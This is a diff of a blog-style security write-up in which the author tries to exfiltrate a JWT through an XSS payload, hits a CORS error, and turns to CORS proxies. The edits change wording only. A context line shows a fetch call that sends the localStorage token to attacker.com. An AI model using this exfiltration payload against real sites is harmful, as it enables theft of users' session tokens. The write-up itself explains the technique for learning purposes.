@@ -35,8 +35,6 @@ fetch("https://attacker.com:8000/jwt=" + JSON.stringify(localStorage.getItem("to
 Nope-- what greeted me was this sad little error message in the console instead:
 
 > Access to fetch at 'https://attacker.com:8000/?jwt=xxx' from origin 'https://example.redacted.com' has been blocked by CORS policy: No 'Access-Control-Allow-Origin' header is present on the requested resource.
->
-> If an opaque response serves your needs, set the request's mode to 'no-cors' to fetch the resource with CORS disabled.
 
 Very sad indeed.
 
@@ -81,7 +79,7 @@ Access-Control-Allow-Origin: https://example.com
 
 And this is why we had our little error: our `https://attacker.com/` doesn't return the necessary CORS header to allow our XSS payload to do its magic.
 
-## Fixing the Errors...
+## Okay... how do we solve this?
 
 > Wait a sec-- didn't you say that requests would still be sent? You should be able to see the incoming request which would have the JWT you sent!
 
@@ -98,7 +96,7 @@ Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 ██████████ -- [16/Mar/2023 12:57:58] "ü0!>Êó*!SEu´cj<ºaaÅ3ãqH· â3qøÂµßS02§[¾(dà¥ÃGz|_t}Å|"À+À/Ì©Ì¨À,À0À" 400 -
 ```
 
-No amount of Googling had enlightened me on what-the-loving-fuck is happening here (probably something to do with that missing CORS header), so I moved on to my next brilliant idea -- using CORS proxies!
+No amount of Googling had enlightened me on what-the-loving-f\*\*k is happening here (probably something to do with that missing CORS header), so I moved on to my next brilliant idea -- using CORS proxies!
 
 A CORS proxy essentially acts as an intermediary that helpfully adds the required `Access-Control-Allow-Origin` header. It's easy -- doesn't require server setups of any kind -- and already has many instances online for immediate use (e.g. `CORS Anywhere`, `alloworigin`).
 
